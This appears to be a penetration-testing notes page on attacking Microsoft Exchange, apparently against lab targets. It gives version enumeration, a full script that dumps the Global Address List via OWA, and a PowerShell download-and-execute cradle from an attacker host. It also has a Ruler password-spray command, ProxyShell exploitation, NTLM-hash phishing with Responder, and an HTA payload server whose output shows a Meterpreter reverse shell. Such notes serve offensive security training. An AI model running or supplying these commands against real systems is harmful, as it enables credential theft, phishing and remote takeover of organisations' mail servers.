# Exchange

To enumerate the version of Microsoft Exchange

```bash
curl https://10.129.132.217/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version 
```

### Exporting username listss

If we already have access to a computer within the domain or an email. [https://github.com/pigeonburger/global-address-list-owa](https://github.com/pigeonburger/global-address-list-owa)

<details>

<summary>Modified script to bypass SSL errors</summary>

```
# Extraction of the Global Address List (GAL) on Exchange >=2013 servers via Outlook Web Access (OWA) 
# By Pigeonburger, June 2021
# https://github.com/pigeonburger

# module import heehoo
import requests, json, argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# argparser hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
parser = argparse.ArgumentParser(description="Extract the Global Address List (GAL) on Exchange 2013 servers via Outlook Web Access (OWA)")
parser.add_argument("-i", "--host", dest="hostname",
                  help="Hostname for the Exchange Server", metavar="HOSTNAME", type=str, required=True)
parser.add_argument("-u", "--username", dest="username",
                  help="A username to log in", metavar="USERNAME", type=str, required=True)
parser.add_argument("-p", "--password", dest="password",
                  help="A password to log in", metavar="PASSWORD", type=str, required=True)
parser.add_argument("-o", "--output-file", dest="output",
                  help="Specify file to output emails to (default is global_address_list.txt)", metavar="OUTPUT FILE", type=str, default="global_address_list.txt")

args = parser.parse_args()

url = args.hostname
USERNAME = args.username
PASSWORD = args.password
OUTPUT = args.output


# Start the session
s = requests.Session()
print("Connecting to %s/owa" % url)


# Get OWA landing page
# Add https:// scheme if not already added in the --host arg
try:
    s.get(url+"/owa", verify=False)
    URL = url
except requests.exceptions.MissingSchema:
    s.get("https://"+url+"/owa", verify=False)
    URL = "https://"+url


# Other URLs we need later
AUTH_URL = URL+"/owa/auth.owa"
PEOPLE_FILTERS_URL = URL + "/owa/service.svc?action=GetPeopleFilters"
FIND_PEOPLE_URL = URL + "/owa/service.svc?action=FindPeople"


# Attempt a login to OWA
login_data={"username":USERNAME, "password":PASSWORD, 'destination': URL, 'flags': '4', 'forcedownlevel': '0'}
r = s.post(AUTH_URL, data=login_data, headers={'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}, verify=False)


# The Canary is a unique ID thing provided upon a successful login that's also required in the header for the next few requests to be successful.
# Even upon an incorrect login, OWA still gives a 200 status, so we can also check if the login was successful by seeing if this cookie was set or not.
try:
    session_canary = s.cookies['X-OWA-CANARY']
except:
    exit("\nInvalid Login Details. Login Failed.")
print("\nLogin Successful!\nCanary key:", session_canary)


# Returns an object containing the IDs of all accessible address lists, so we can specify one in the FindPeople request
r = s.post(PEOPLE_FILTERS_URL, headers={'Content-type': 'application/json', 'X-OWA-CANARY': session_canary, 'Action': 'GetPeopleFilters'}, data={}, verify=False).json()


# Find the Global Address List id
for i in r:
    if i['DisplayName'] == "Default Global Address List":
        AddressListId = i['FolderId']['Id']
        print("Global List Address ID:", AddressListId)
        break


# Set to None to return all emails in the list (this is the search term for the FindPeople request)
query = None


# Set the max results for the FindPeople request.
max_results = 99999


# POST data for the FindPeople request
peopledata = {
    "__type": "FindPeopleJsonRequest:#Exchange",
    "Header": {
        "__type": "JsonRequestHeaders:#Exchange",
        "RequestServerVersion": "Exchange2013",
        "TimeZoneContext": {
            "__type": "TimeZoneContext:#Exchange",
            "TimeZoneDefinition": {
                "__type": "TimeZoneDefinitionType:#Exchange",
                "Id": "AUS Eastern Standard Time"
            }
        }
    },
    "Body": {
        "__type": "FindPeopleRequest:#Exchange",
        "IndexedPageItemView": {
            "__type": "IndexedPageView:#Exchange",
            "BasePoint": "Beginning",
            "Offset": 0,
            "MaxEntriesReturned": max_results
        },
        "QueryString": query,
        "ParentFolderId": {
            "__type": "TargetFolderId:#Exchange",
            "BaseFolderId": {
                "__type": "AddressListId:#Exchange",
                "Id": AddressListId
            }
        },
        "PersonaShape": {
            "__type": "PersonaResponseShape:#Exchange",
            "BaseShape": "Default"
        },
        "ShouldResolveOneOffEmailAddress": False
    }
}


# Make da request.
r = s.post(FIND_PEOPLE_URL, headers={'Content-type': 'application/json', 'X-OWA-CANARY': session_canary, 'Action': 'FindPeople'}, data=json.dumps(peopledata), verify=False).json()


# Parse out the emails, print them and append them to a file.
userlist = r['Body']['ResultSet']

with open(OUTPUT, 'a+') as outputfile:
    for user in userlist:
        email = user['EmailAddresses'][0]['EmailAddress']
        outputfile.write(email+"\n")
        print(email)

print("\nFetched %s emails" % str(len(userlist)))
print("Emails written to", OUTPUT)
```

</details>

```bash
python3 emailextract.py -i exch01.zencorp.local -u zen@zencorp.ocal -p 'pass@123'
```

#### Or use windows

PS C:\Tools> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.228:8000/MailSniper.ps1') PS C:\Tools> Get-GlobalAddressList -ExchHostname exch01.zencorp.local -Username zen -Password 'pass@123' -OutFile globaladdresslist.txt

### <mark style="color:yellow;">Password Spray</mark>

Use Ruler for password Spray

```bash
./ruler-linux64 --domain zencorp.local --insecure brute --users global_address_list.txt --passwords passwords.txt --verbose -a 4
```

### <mark style="color:yellow;">ProxyShell</mark>

```bash
proxyshell.py -u https://10.129.230.42/ -e Administrator@zencorp.local 
```

Or use metasploit

```bash
use exploit/windows/http/exchange_proxyshell_rce
```

### <mark style="color:yellow;">Phishing Attacks</mark>

Generate a htm file with ntlm\_theft, create htm file, attach in email and capture in Responder

```bash
# Create html file
python3 ntlm_theft.py -g htm -s 10.10.14.80 -f students

# Responder
sudo responder -I tun0
```

#### Arbitrary File Execution

With [https://www.shellterproject.com/](https://www.shellterproject.com/) its possible to take a legit executable and inject a malicious code to get a reverse shell.

#### Create a HTA file

```bash
# It will create and host the .hta file
msfconsole -x "use exploit/windows/misc/hta_server; set LHOST 10.10.14.207; set LPORT 8443; set SRVHOST 10.10.14.207; run -j"

# Send the link and once clicked
[*] Meterpreter session 1 opened (10.10.14.207:8443 -> 10.129.231.81:62367) at 2024-08-13 17:52:01 -0400
```
